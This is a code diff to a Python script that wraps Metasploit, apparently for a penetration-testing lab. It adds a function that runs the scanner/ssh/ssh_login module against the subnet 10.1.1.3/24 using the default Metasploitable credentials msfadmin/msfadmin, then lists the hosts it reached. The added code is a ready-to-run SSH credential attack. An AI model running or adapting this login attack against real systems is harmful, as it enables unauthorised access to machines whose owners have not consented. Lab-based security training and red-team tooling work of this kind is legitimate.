@@ -13,7 +13,41 @@ msfInstance = msf.Metasploit(password, e)
 e.register(name="msf", framework=msfInstance)
 #e.register(name="sliver", framework=sliverInstance)
 
-msfInstance.run_exploit('auxiliary', 'scanner/ssh/ssh_login')
+#version1:
+# msfInstance.run_exploit('auxiliary', 'scanner/ssh/ssh_login')
+
+#version2:
+# Extracted Exploit Logic
+def run_msf_exploit():
+    # Set up exploit details
+    mtype = 'auxiliary'
+    mname = 'scanner/ssh/ssh_login'
+    rhosts = '10.1.1.3/24'
+    username = 'msfadmin'
+    password = 'msfadmin'
+    threads = 5
+
+    # Use the exploit from Metasploit
+    exploit = msfInstance.client.modules.use(mtype, mname)
+    exploit["RHOSTS"] = rhosts
+    exploit["USERNAME"] = username
+    exploit["PASSWORD"] = password
+    exploit["THREADS"] = threads
+
+    # Execute the exploit
+    print(f"Running exploit: {mname} on {rhosts}...")
+    result = exploit.execute()
+    print("Exploit Result:", result)
+
+    # Wait for scan completion
+    if 'job_id' in result and result['job_id'] != 0:
+        print("[+] Exploit scan started successfully.")
+    else:
+        print("[!] Exploit scan failed.")
+    return result
+
+exploit_result = run_msf_exploit()
+
 # Retrieve and print hosts
 hostSet = e.get_hosts()  # Retrieve all connected hosts across frameworks
 print("Hosts =", hostSet)
